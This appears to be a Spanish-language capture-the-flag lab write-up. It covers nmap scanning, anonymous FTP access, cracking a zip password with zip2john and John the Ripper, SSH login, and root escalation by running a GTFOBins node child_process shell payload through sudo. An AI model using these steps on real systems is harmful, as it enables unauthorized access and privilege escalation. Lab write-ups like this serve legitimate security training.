# Herramientas
- Nmap
- John The Ripper
- GTFOBins
# Procedimiento
Escaneamos los puertos con nmap y notamos que hay dos puertos abiertos, el 21 y el 22. 
![[Pasted image 20250716175635.png]]

Por lo que procedemos a entrar al ftp con usuario `anonymous` y sin contraseña. Listamos los archivos con `ls` y vemos lo siguiente:
![[Pasted image 20250716175745.png]]

Guardamos el archivo con `get secretitopicaron.zip` y salimos de ftp. 

Cuando tratamos de hacer `unzip` nos dice que debemos ingresar una contraseña, la cual no tenemos NI IDEA cuál podría ser. Por lo que debemos obtener el hash del archivo, y vamos a ocupar John The Ripper. 
```
zip2john secretitopicaron.zip > hash
```

Una vez obtenido el hash, usamos el siguiente comando:
```
john --wordlist==/usr/share/wordlists/rockyou.txt hash
```

Y así obtenemos la contraseña:
![[Pasted image 20250716180842.png]]

Así, al descomprimir el archivo, vemos que hay un archivo llamado `password.txt`.
![[Pasted image 20250716180954.png]]

Con esto podemos entrar al SSH. Al entrar y hacer un `cat`, vemos que hay un archivo llamado `script.js`. En este punto, ocupamos también `sudo -l` y vemos lo siguiente:
![[Pasted image 20250716181521.png]]

Nos vamos a GTFOBins y buscamos `node`:
![[Pasted image 20250716181629.png]]

De acá lo que debemos copiar es:
```
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})

```

Y pegarlo en `script.js`. Finalmente, ejecutamos el siguiente comando:
```
sudo /usr/bin/node /home/mario/script.js
```

Confirmamos que hemos escalado privilegios con `whoami`:
![[Pasted image 20250716182011.png]]